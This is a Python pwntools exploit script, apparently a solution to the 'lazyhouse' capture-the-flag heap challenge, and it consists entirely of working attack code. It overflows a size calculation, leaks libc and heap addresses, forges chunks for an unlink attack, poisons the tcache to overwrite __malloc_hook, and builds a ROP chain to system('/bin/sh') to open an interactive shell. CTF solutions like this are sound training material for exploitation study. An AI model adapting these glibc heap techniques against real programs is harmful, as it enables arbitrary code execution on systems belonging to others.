#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./lazyhouse')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(c):
    p.recvuntil('choice: ')
    p.sendline(str(c))

def new(idx, sz, content):
    cmd(1)
    p.recvuntil('Your money:')
    money = int(p.recvuntil('\n', drop=True))
    info('money = ' + hex(money))
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('Size:')
    p.sendline(str(sz))
    if sz < pow(2, 32):
        p.recvuntil('House:')
        p.send(content)
        sleep(0.1)

def show(idx):
    cmd(2)
    p.recvuntil('Index:')
    p.sendline(str(idx))

def free(idx):
    cmd(3)
    p.recvuntil('Index:')
    p.sendline(str(idx))

def edit(idx, content):
    cmd(4)
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('House:')
    p.send(content)
    sleep(0.1)

def secret(content):
    cmd(5)
    p.recvuntil('House:')
    p.send(content)
    sleep(0.1)

size = int((pow(2, 64) - 1) // 0xDA) + 1
info('size = ' + hex(size))
new(0, size, '0') # bypass
free(0)
new(0, 0x88, '0')
new(1, 0x508, '1') # put into largebins later for leak
new(2, 0x88, '2')
free(1)
new(1, 0x608, '1') # trigger consolidate ; put 0x508 into largebins
edit(0, '\x00' * 0x88 + p64(0x513)) # set IS_MMAPED
new(7, 0x508, '7')
show(7)
leak_data = p.recvn(0x500)
libc_base = u64(leak_data[0x8:0x10]) - 0x1e50d0
info('libc_base = ' + hex(libc_base))
heap_base = u64(leak_data[0x10:0x18]) - 0x2e0
info('heap_base = ' + hex(heap_base))
#gdb.attach(p)

free(0)
free(1)
free(2)
size = 0x90 * 4 - 0x10
target = heap_base + 0x890
payload = p64(0) + p64(size | 1) + p64(target + 0x20 - 0x18) + p64(target + 0x20 - 0x10) + p64(target)
new(6, 0x88, payload) # create fake chunk for unlink
new(5, 0x88, '5')
new(0, 0x88, '0')
new(1, 0x88, '1')
new(2, 0x608, '\x00' * 0x508 + p64(0x101))
edit(1, '\x00' * 0x80 + p64(size) + p64(0x610)) # overwrite prev_size & size (PREV_INUSE)
free(2) # unlink
payload = (
    '\x00' * 0x78 + p64(0x6c1) + # 5
    '\x00' * 0x88 + p64(0x31) + # 0
    '\x00' * 0x88 + p64(0x21) # 1
)
new(2, 0x508, payload) # merge into top chunk
free(0)
free(1)
free(2)
#gdb.attach(p)

new(0, 0x1a8, '\x00' * 0x78 + p64(0x6c1))
new(1, 0x218, '1')
new(2, 0x218, '2')
free(2)
new(2, 0x218, '\x00' * 0x148 + p64(0xd1)) # create fake chunk ; bypass check
free(2)
for i in range(5):
    new(2, 0x218, '2')
    free(2) # fillup tcache 0x220
new(2, 0x3a8, '2')
free(2) # create fake size in tcache_pthread_struct
#raw_input('@')
free(1)
new(1, 0x228, '1') # trigger consolidate ; put into smallbins 0x100
free(5)
#raw_input('@')
smallbins_addr = libc_base + 0x1e4eb0
tcache_fake_chunk_addr = heap_base + 0x40
payload = '\x00' * 0x98 + p64(0x31) + p64(tcache_fake_chunk_addr) + '\x00' * 0x80 + p64(0x221) + p64(smallbins_addr) + p64(tcache_fake_chunk_addr)
new(5, 0x6b1, payload)
#raw_input('@')

pop_rdi_ret = libc_base + next(libc.search(asm('pop rdi ; ret')))
pop_rsi_ret = libc_base + next(libc.search(asm('pop rsi ; ret')))
pop_rdx_ret = libc_base + next(libc.search(asm('pop rdx ; ret')))
pop_rax_ret = libc_base + next(libc.search(asm('pop rax ; ret')))
leave_ret = libc_base + next(libc.search(asm('leave ; ret')))
syscall_ret = libc_base + next(libc.search(asm('syscall ; ret')))
#bin_sh_addr = libc_base + next(libc.search('/bin/sh'))
bin_sh_addr = heap_base + 0xa50
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
system_addr = libc_base + libc.symbols['system']
rop_offset = heap_base + 0xa70 - 0x8
payload = '/bin/sh'.ljust(0x20, '\x00') + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
new(3, 0x218, payload) # set rop chain
#raw_input('@')
new(2, 0x218, p64(0) * 0x20 + p64(malloc_hook_addr)) # overwrite tcache 0x220's entry
secret(p64(leave_ret))
info('leave_ret = ' + hex(leave_ret))
raw_input('@')
new(4, rop_offset, '4')
p.interactive()

